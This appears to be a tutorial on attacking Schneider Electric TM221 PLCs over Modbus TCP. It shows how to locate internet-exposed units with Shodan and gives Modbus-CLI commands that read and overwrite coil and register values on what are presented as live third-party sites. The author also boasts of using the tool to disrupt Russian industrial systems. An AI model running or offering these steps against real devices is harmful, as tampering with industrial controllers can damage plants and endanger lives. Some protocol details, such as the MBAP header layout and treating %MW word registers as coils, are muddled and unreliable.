+Modbus TCP adds a Modbus Application Protocol (MBAP) to the Modbus RTU frame. It is 7 bytes long with 2 bytes for the header, 2 bytes for the protocol identifier, 2 bytes in length, and 1 byte for the address (Unit ID).
+
+#### Modbus Security
+
+Modbus has numerous security concerns:
+
+* **Lack of authentication:** Modbus does not include any form of authentication. An attacker only needs to create a packet with a valid address, function code, and any associated data.
+* **No encryption:** All communication over Modbus is done in cleartext. An attacker can sniff the communication between the master and slaves and discern the configuration and use.
+* **No Checksum:** Although Modbus RTU uses a message checksum, when Modbus is implemented in TCP/IP, the checksum is generated in the transport layer, not the application layer, enabling the attacker to spoof Modbus packets.
+* **No Broadcast Suppression:** Without broadcast suppression (all addresses receive all messages), the attacker can create a DoS condition through a flood of messages.
+
+For a more thorough understanding of the Modbus protocol, check out my article on Modbus simulation here.
+
+### SCADA Security and Vulnerabilities
+
+SCADA/ICS security is probably the most important and overlooked field of cybersecurity. In an era where cyber warfare is an everyday occurrence and cyber terrorism is an ongoing threat, these huge industrial facilities have large bullseyes on their backs. In some cases, taking down or disrupting just one of these plants could cost billions of US dollars and many lives. That is why everyone in our industry needs to become conversant in this field. For more background in SCADA/ICS, check out my section on this increasingly important field of information security.
+
+PLCs (Programmable Logic Controllers) control nearly everything in the SCADA/ICS industry. These PLCs control everything from petroleum refineries to manufacturing facilities, waste and sewage plants, and the electric grid. Schneider Electric, based in Paris, France, is one of the world's largest manufacturers of these devices and sells them to a variety of industries.
+
+Schneider Electric makes a PLC known as the TM221 that is widely used by small-to-medium-sized manufacturing facilities to automate their processes. These PLCs use multiple communication protocols, including the ubiquitous Modbus/TCP. To learn more about this SCADA/ICS communication protocol, check out my article on Modbus here and do the Modbus simulation here. Without this understanding of Modbus, what follows here will seem opaque.
+
+It turns out that many of these PLCs are very easy to hack using multiple SCADA/ICS tools. Here, I want to show you how to hack these PLCs using the hacking/pentesting tool Modbus-CLI.
+
+#### Finding the TM221 with Shodan
+
+First, let's see if we can find any of these PLCs connected to the Internet by using Shodan. For more on using Shodan to find SCADA/ICS facilities, check out my article here.
+
+We can simply type "TM221" into the search bar of Shodan, and it will return all the IP addresses that contain that string in their banners. As you can see below, there are quite a few. Many of these are vulnerable systems.
+
+#### Install Modbus-CLI
+
+Now that we have located some potentially vulnerable sites using the Schneider Electric TM221, let's see if we can exploit them. Here we will be using a tool dedicated to exploiting the Modbus protocol called Modbus-CLI. Modbus-CLI is a command line (CLI) tool that enables us to read and write Modbus/TCP (not serial Modbus).
+
+This is a tool we used often to disrupt Russian industrial systems during the Ukraine/Russia war.
+
+We can get this tool by entering the following;
+
+```bash
+kali > gem install modbus-cli
+```
+
+Now that we have downloaded Modbus-CLI, we can begin to recon and exploit the sites found by using Shodan above.
+
+#### Modbus-CLI Syntax
+
+This command-line tool uses simple syntax. To learn a bit of its syntax, let's display its help screen:
+
+```bash
+kali > modbus --help
+```
+
+As you see, the basic syntax is as follows:
+
+```bash
+kali > modbus [options] SUBCOMMAND [arguments]
+```
+
+**Address Terminology**
+
+Let's start by reading the values from one of these Schneider Electric sites (I have obscured the IP to protect the innocent and insecure). Before we do so, though, we need to discuss ways to designate addresses on these Schneider Electric Modbus devices.
+
+We have at least two ways to address these devices and their values: the Schneider Electric mode and the Modicon mode. As we can see in the table below, the Schneider Electric terminology begins with %M before the address. We will begin by using this terminology and then progress to the Modicon terminology.
+
+So, if we want to read the first ten values beginning with address %MW100, we could simply enter the following:
+
+```bash
+kali > modbus read <IP> %MW100 10
+```
+
+As you can see, Modbus-CLI was capable of pulling the values from the specified ten memory registers.
+
+We can also use Modicon terminology to do the same.
+
+```bash
+kali > modbus read <IP> 400101 10
+```
+
+If we want more info on the read subcommand, we can simply type --help after Modbus and then read, such as:
+
+```bash
+kali > modbus read --help
+```
+
+**Reading the Coils**
+
+Let's now try reading the values
+
+of the coils. These will be Boolean (ON/OFF) values. The coils are either ON or OFF with values of 0 or 1. Since we are reading coil values, we use the Modicon address of 101 rather than the Schneider address and then read ten values.
+
+```bash
+kali > modbus read <IP> 101 10
+```
+
+As we can see below, coils 101, 103, and 105 are all ON (1). The others are all OFF (0).
+
+**Writing New Values to the Coils**
+
+Now, let’s see if we can change those values in the coils. Let's try to turn them all ON. We can do this with the write subcommand. In this case, we will start with the Schneider address terminology %MW100 and place 1's in each coil, turning them all ON.
+
+```bash
+kali > modbus write <IP> %MW100 1 1 1 1 1 1 1 1 1 1
+```
+
+Now, when we go back to read those coils, we can see they have all been activated!
+
+```bash
+kali > modbus read <IP> %MW100 10
+```
+
+**Reading the Values into an Output File**
+
+Finally, we can read all the values into a text file. We may want to do this for later analysis or as a backup. In this case, let's read 100 coil values into a file named `scadaoutput.txt`.
+
+```bash
+kali > modbus read --output scadaoutput.txt <IP> %MW100 100
+```
+
+Now, when we cat that file, we see that we have captured and saved all the values of 100 coils. Note that the first ten are still all ON.
+
+***
+
